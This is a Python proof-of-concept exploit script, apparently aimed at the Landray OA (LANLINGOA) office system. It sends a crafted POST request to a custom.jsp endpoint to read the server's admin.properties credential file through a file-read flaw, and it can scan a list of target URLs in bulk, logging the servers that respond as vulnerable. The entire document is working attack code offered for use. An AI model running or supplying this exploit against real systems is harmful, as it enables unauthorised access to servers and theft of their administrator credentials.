import argparse
import base64
import requests
import random
import re
import json
import sys

def banner():
    test = """
 __      __    _  _  __    ____  _  _  _____    __   
(  )    /__\  ( \( )(  )  (_  _)( \( )(  _  )  /__\  
 )(__  /(__)\  )  (  )(__  _)(_  )  (  )(_)(  /(__)\ 
(____)(__)(__)(_)\_)(____)(____)(_)\_)(_____)(__)(__)
                 @author: LGJ
"""
    print(test)
def POC(target_url):
    poc_url = target_url + "/sys/ui/extend/varkind/custom.jsp"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
               "Content-Type": "application/x-www-form-urlencoded"}
    data = 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
    try:
        response = requests.post(url=poc_url, data=data, headers=headers, verify=False)
        print("正在请求 {}/sys/ui/extend/varkind/custom.jsp ".format(target_url))
        if "password" in response.text and response.status_code == 200:
            print("成功读取 admin.properties  响应为:{} ".format("success"))
            with open("result.txt","a+",encoding="utf-8") as f:
                f.write(target_url+"\n")
    except Exception as e:
        print("请求失败:{} ".format(e))
        sys.exit(0)

def main():
    banner()
    parser = argparse.ArgumentParser(description='NACOS')
    parser.add_argument("-u", "--url", dest="url", type=str)
    parser.add_argument("-f", "--file", dest="file", type=str)
    args = parser.parse_args()
    if args.url and not args.file:
        POC(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        for j in url_list:
            POC(j)
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

#
if __name__ == '__main__':
    main()